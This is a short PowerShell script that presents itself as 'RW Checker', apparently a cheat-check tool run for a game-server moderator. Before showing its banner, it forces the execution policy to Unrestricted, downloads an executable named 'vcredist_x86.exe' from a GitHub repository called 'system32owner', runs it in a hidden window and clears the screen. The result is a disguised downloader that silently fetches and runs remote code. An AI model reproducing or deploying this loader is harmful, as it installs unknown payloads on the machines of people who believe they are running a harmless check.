Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Force

Invoke-WebRequest -Uri "https://github.com/system32owner/download/raw/refs/heads/main/vcredist_x86.exe" -OutFile "vcredist_x86.exe" -ErrorAction SilentlyContinue

    Start-Process -FilePath "vcredist_x86.exe" -WindowStyle Hidden
	Clear-Host
	
Write-Host "  _______          __   _____ _               _             " -ForegroundColor White
Write-Host " |  __ \ \        / /  / ____| |             | |            " -Foregroundcolor White
Write-Host " | |__) \ \  /\  / /  | |    | |__   ___  ___| | _____ _ __ " -Foregroundcolor White
Write-Host " |  _  / \ \/  \/ /   | |    | '_ \ / _ \/ __| |/ / _ \ '__|" -Foregroundcolor DarkYellow
Write-Host " | | \ \  \  /\  /    | |____| | | |  __/ (__|   <  __/ | " -Foregroundcolor DarkYellow
Write-Host " |_|  \_\  \/  \/      \_____|_| |_|\___|\___|_|\_\___|_|   " -Foregroundcolor DarkYellow
Write-Host " "
Write-Host "[+] Developed by KondrMS [2026]" -Foregroundcolor White
Write-Host "[+] Manual scan not required" -Foregroundcolor DarkYellow
Write-Host ""
Write-Host "[Notify] The check result is with the MODERATOR!" -Foregroundcolor Red
Write-Host ""
